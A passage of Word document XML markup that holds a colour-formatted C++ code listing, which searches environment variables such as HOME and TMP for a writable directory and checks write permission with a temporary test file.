        <w:t xml:space="preserve"> type</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">109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"HOME"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110         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>envVarsToTry.push_back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"TMP"</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111 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>112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directory;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">113         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">114         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//TODO There is no portable (platform independent) way to set permissions on a directory/file so that the creator</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">115         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//      is the only one with permissions.  A utility library to handle common platforms will have to be developed.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">116         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">117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0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>envVarsToTry.size</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118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(Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getEnvVar</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envVarsToTry</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119                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// We just use '/' as a path separator since APIs don't get picky about it regardless of the platform</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>120                         directory = *(Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getEnvVar</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envVarsToTry</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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PROGRAM_NAME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121                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Can we write to this path?</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122                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">123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(!boost::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::exists(directory) &amp;&amp; boost::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</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create_directory</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(directory)) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">124                                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Success so use this</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">125                                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>break</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126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(boost::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::exists(directory)) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">127                                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Directory already exists (previous run probably) so try a test file</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>128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testWriteableFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = directory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makeSafeFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getCurrentTimestamp</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tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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129                                 std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ofstream</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testStream</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130                                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testStream.open</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testWriteableFile.c_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(), std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ios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9900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>out</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> | std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ios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9900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>binary</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131                                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testStream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"TESTING FOR WRITE PERMISSION"</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132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testStream.fail</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133                                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Not a good one</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">134                                         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testStream.close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135                                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">136                                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>continue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137                                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">138 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">139                                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Write was successful</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">140                                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testStream.close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141                                 boost::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::remove(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testWriteableFile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142                                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>break</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143                         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>144                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>145         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">146         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">147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directory.empty</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148                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// Failed to find anything.  All </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystems</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> read-only?</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
